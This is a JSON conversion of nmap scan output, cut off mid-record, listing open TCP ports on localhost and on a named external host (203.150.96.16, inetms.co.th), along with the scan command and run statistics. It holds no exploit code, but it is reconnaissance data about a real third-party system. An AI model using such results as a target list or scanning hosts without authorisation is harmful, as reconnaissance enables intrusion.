{
    "0": {
        "\ufeff\"scanner\"": "nmap",
        "args": "nmap -Pn -oX nmap.xml -iL nmaptest.txt",
        "start": "1646979976",
        "startstr": "Fri Mar 11 13:26:16 2022",
        "version": "7.92",
        "xmloutputversion": "1.05",
        "scaninfo__type": "syn",
        "scaninfo__protocol": "tcp",
        "scaninfo__numservices": "1000",
        "scaninfo__services": "1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,443-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389",
        "verbose__level": "0",
        "debugging__level": "0",
        "host__starttime": "1646979980",
        "host__endtime": "1646979980",
        "host__status__state": "up",
        "host__status__reason": "user-set",
        "host__status__reason_ttl": "0",
        "host__address__addr": "127.0.0.1",
        "host__address__addrtype": "ipv4",
        "host__hostnames__hostname__name": "localhost",
        "host__hostnames__hostname__type": "PTR",
        "host__ports__extraports__state": "closed",
        "host__ports__extraports__count": "990",
        "host__ports__extraports__extrareasons__reason": "reset",
        "host__ports__extraports__extrareasons__count": "990",
        "host__ports__extraports__extrareasons__proto": "tcp",
        "host__ports__extraports__extrareasons__ports": "1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79-85,88-90,99-100,106,109-111,113,119,125,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,444,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-901,903,911,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1310-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999,8001-8002,8007-8011,8021-8022,8031,8042,8045,8080,8082-8088,8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "135",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "msrpc",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "1518",
        "host__times__rttvar": "1385",
        "host__times__to": "100000",
        "runstats__finished__time": "1646979986",
        "runstats__finished__timestr": "Fri Mar 11 13:26:26 2022",
        "runstats__finished__summary": "Nmap done at Fri Mar 11 13:26:26 2022; 2 IP addresses (2 hosts up) scanned in 10.56 seconds",
        "runstats__finished__elapsed": "10.56",
        "runstats__finished__exit": "success",
        "runstats__hosts__up": "2",
        "runstats__hosts__down": "0",
        "runstats__hosts__total": "2"
    },
    "1": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "",
        "host__hostnames__hostname__type": "",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "443",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "https",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "2": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "",
        "host__hostnames__hostname__type": "",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "445",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "microsoft-ds",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "3": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "",
        "host__hostnames__hostname__type": "",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "902",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "iss-realsecure",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "4": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "",
        "host__hostnames__hostname__type": "",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "912",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "apex-mesh",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "5": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "",
        "host__hostnames__hostname__type": "",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "1309",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "jtag-server",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "6": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "",
        "host__hostnames__hostname__type": "",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "2179",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "vmrdp",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "7": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "",
        "host__hostnames__hostname__type": "",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "8000",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "http-alt",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "8": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "",
        "host__hostnames__hostname__type": "",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "8081",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "blackice-icecap",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "9": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "",
        "host__hostnames__hostname__type": "",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "8089",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "128",
        "host__ports__port__service__name": "unknown",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "",
        "host__times__rttvar": "",
        "host__times__to": "",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "10": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "1646979980",
        "host__endtime": "1646979986",
        "host__status__state": "up",
        "host__status__reason": "user-set",
        "host__status__reason_ttl": "0",
        "host__address__addr": "203.150.96.16",
        "host__address__addrtype": "ipv4",
        "host__hostnames__hostname__name": "inetms.co.th",
        "host__hostnames__hostname__type": "user",
        "host__ports__extraports__state": "filtered",
        "host__ports__extraports__count": "998",
        "host__ports__extraports__extrareasons__reason": "no-response",
        "host__ports__extraports__extrareasons__count": "998",
        "host__ports__extraports__extrareasons__proto": "tcp",
        "host__ports__extraports__extrareasons__ports": "1,3-4,6-7,9,13,17,19-26,30,32-33,37,42-43,49,53,70,79,81-85,88-90,99-100,106,109-111,113,119,125,135,139,143-144,146,161,163,179,199,211-212,222,254-256,259,264,280,301,306,311,340,366,389,406-407,416-417,425,427,444-445,458,464-465,481,497,500,512-515,524,541,543-545,548,554-555,563,587,593,616-617,625,631,636,646,648,666-668,683,687,691,700,705,711,714,720,722,726,749,765,777,783,787,800-801,808,843,873,880,888,898,900-903,911-912,981,987,990,992-993,995,999-1002,1007,1009-1011,1021-1100,1102,1104-1108,1110-1114,1117,1119,1121-1124,1126,1130-1132,1137-1138,1141,1145,1147-1149,1151-1152,1154,1163-1166,1169,1174-1175,1183,1185-1187,1192,1198-1199,1201,1213,1216-1218,1233-1234,1236,1244,1247-1248,1259,1271-1272,1277,1287,1296,1300-1301,1309-1311,1322,1328,1334,1352,1417,1433-1434,1443,1455,1461,1494,1500-1501,1503,1521,1524,1533,1556,1580,1583,1594,1600,1641,1658,1666,1687-1688,1700,1717-1721,1723,1755,1761,1782-1783,1801,1805,1812,1839-1840,1862-1864,1875,1900,1914,1935,1947,1971-1972,1974,1984,1998-2010,2013,2020-2022,2030,2033-2035,2038,2040-2043,2045-2049,2065,2068,2099-2100,2103,2105-2107,2111,2119,2121,2126,2135,2144,2160-2161,2170,2179,2190-2191,2196,2200,2222,2251,2260,2288,2301,2323,2366,2381-2383,2393-2394,2399,2401,2492,2500,2522,2525,2557,2601-2602,2604-2605,2607-2608,2638,2701-2702,2710,2717-2718,2725,2800,2809,2811,2869,2875,2909-2910,2920,2967-2968,2998,3000-3001,3003,3005-3007,3011,3013,3017,3030-3031,3052,3071,3077,3128,3168,3211,3221,3260-3261,3268-3269,3283,3300-3301,3306,3322-3325,3333,3351,3367,3369-3372,3389-3390,3404,3476,3493,3517,3527,3546,3551,3580,3659,3689-3690,3703,3737,3766,3784,3800-3801,3809,3814,3826-3828,3851,3869,3871,3878,3880,3889,3905,3914,3918,3920,3945,3971,3986,3995,3998,4000-4006,4045,4111,4125-4126,4129,4224,4242,4279,4321,4343,4443-4446,4449,4550,4567,4662,4848,4899-4900,4998,5000-5004,5009,5030,5033,5050-5051,5054,5060-5061,5080,5087,5100-5102,5120,5190,5200,5214,5221-5222,5225-5226,5269,5280,5298,5357,5405,5414,5431-5432,5440,5500,5510,5544,5550,5555,5560,5566,5631,5633,5666,5678-5679,5718,5730,5800-5802,5810-5811,5815,5822,5825,5850,5859,5862,5877,5900-5904,5906-5907,5910-5911,5915,5922,5925,5950,5952,5959-5963,5987-5989,5998-6007,6009,6025,6059,6100-6101,6106,6112,6123,6129,6156,6346,6389,6502,6510,6543,6547,6565-6567,6580,6646,6666-6669,6689,6692,6699,6779,6788-6789,6792,6839,6881,6901,6969,7000-7002,7004,7007,7019,7025,7070,7100,7103,7106,7200-7201,7402,7435,7443,7496,7512,7625,7627,7676,7741,7777-7778,7800,7911,7920-7921,7937-7938,7999-8002,8007-8011,8021-8022,8031,8042,8045,8080-8090,8093,8099-8100,8180-8181,8192-8194,8200,8222,8254,8290-8292,8300,8333,8383,8400,8402,8443,8500,8600,8649,8651-8652,8654,8701,8800,8873,8888,8899,8994,9000-9003,9009-9011,9040,9050,9071,9080-9081,9090-9091,9099-9103,9110-9111,9200,9207,9220,9290,9415,9418,9485,9500,9502-9503,9535,9575,9593-9595,9618,9666,9876-9878,9898,9900,9917,9929,9943-9944,9968,9998-10004,10009-10010,10012,10024-10025,10082,10180,10215,10243,10566,10616-10617,10621,10626,10628-10629,10778,11110-11111,11967,12000,12174,12265,12345,13456,13722,13782-13783,14000,14238,14441-14442,15000,15002-15004,15660,15742,16000-16001,16012,16016,16018,16080,16113,16992-16993,17877,17988,18040,18101,18988,19101,19283,19315,19350,19780,19801,19842,20000,20005,20031,20221-20222,20828,21571,22939,23502,24444,24800,25734-25735,26214,27000,27352-27353,27355-27356,27715,28201,30000,30718,30951,31038,31337,32768-32785,33354,33899,34571-34573,35500,38292,40193,40911,41511,42510,44176,44442-44443,44501,45100,48080,49152-49161,49163,49165,49167,49175-49176,49400,49999-50003,50006,50300,50389,50500,50636,50800,51103,51493,52673,52822,52848,52869,54045,54328,55055-55056,55555,55600,56737-56738,57294,57797,58080,60020,60443,61532,61900,62078,63331,64623,64680,65000,65129,65389",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "80",
        "host__ports__port__state__state": "open",
        "host__ports__port__state__reason": "syn-ack",
        "host__ports__port__state__reason_ttl": "52",
        "host__ports__port__service__name": "http",
        "host__ports__port__service__method": "table",
        "host__ports__port__service__conf": "3",
        "host__times__srtt": "19227",
        "host__times__rttvar": "9677",
        "host__times__to": "100000",
        "runstats__finished__time": "",
        "runstats__finished__timestr": "",
        "runstats__finished__summary": "",
        "runstats__finished__elapsed": "",
        "runstats__finished__exit": "",
        "runstats__hosts__up": "",
        "runstats__hosts__down": "",
        "runstats__hosts__total": ""
    },
    "11": {
        "\ufeff\"scanner\"": "",
        "args": "",
        "start": "",
        "startstr": "",
        "version": "",
        "xmloutputversion": "",
        "scaninfo__type": "",
        "scaninfo__protocol": "",
        "scaninfo__numservices": "",
        "scaninfo__services": "",
        "verbose__level": "",
        "debugging__level": "",
        "host__starttime": "",
        "host__endtime": "",
        "host__status__state": "",
        "host__status__reason": "",
        "host__status__reason_ttl": "",
        "host__address__addr": "",
        "host__address__addrtype": "",
        "host__hostnames__hostname__name": "16.96.150.203.sta.inet.co.th",
        "host__hostnames__hostname__type": "PTR",
        "host__ports__extraports__state": "",
        "host__ports__extraports__count": "",
        "host__ports__extraports__extrareasons__reason": "",
        "host__ports__extraports__extrareasons__count": "",
        "host__ports__extraports__extrareasons__proto": "",
        "host__ports__extraports__extrareasons__ports": "",
        "host__ports__port__protocol": "tcp",
        "host__ports__port__portid": "443",
        "host__ports__port__state__state": "open",
